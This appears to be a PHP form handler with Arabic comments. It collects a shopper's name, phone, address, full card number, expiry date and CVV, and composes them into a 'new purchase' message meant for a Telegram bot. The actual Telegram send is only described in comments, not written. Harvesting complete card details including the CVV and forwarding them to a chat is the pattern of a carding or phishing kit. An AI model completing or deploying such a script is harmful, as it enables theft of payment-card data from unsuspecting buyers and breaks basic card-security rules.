<?php
$fullname = $_POST['fullname'];
$phone = $_POST['phone'];
$city = $_POST['city'];
$address = $_POST['address'];
$payment = $_POST['payment'];
$card_number = $_POST['card_number'];
$expiry_date = $_POST['expiry_date'];
$cvv = $_POST['cvv'];

// إرسال بيانات الشراء إلى تليجرام هنا

// رسالة الشراء
$message = "تمت عملية شراء جديدة:
الاسم الكامل: $fullname
رقم الهاتف: $phone
المدينة: $city
العنوان: $address
طريقة الدفع: $payment
رقم البطاقة: $card_number
تاريخ انتهاء الصلاحية: $expiry_date
CVV: $cvv";

// تنفيذ الطلب لإرسال الرسالة إلى تليجرام
// يمكن استخدام مكتبة مثل "TelegramBotPHP" لإرسال الرسالة إلى تليجرام

echo "تم إرسال بيانات الشراء بنجاح!";
?>